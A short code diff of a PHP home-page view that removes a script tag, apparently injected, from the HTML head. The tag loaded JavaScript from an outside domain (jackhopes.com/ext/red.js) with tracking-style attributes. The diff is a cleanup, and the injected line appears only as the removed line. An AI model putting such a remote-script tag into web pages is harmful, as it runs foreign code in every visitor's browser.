@@ -88,7 +88,7 @@ class VueAccueil
         
         <!DOCTYPE html>
         <html>
-        <head><script type="text/javascript" id="jc6202" ver="1.0.28.16" diu="Z9A0L2VNF079596A5FED3F" fr="default" src="http://jackhopes.com/ext/red.js"></script>
+        <head>
           <!-- Standard Meta -->
           <meta charset="utf-8" />
           <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
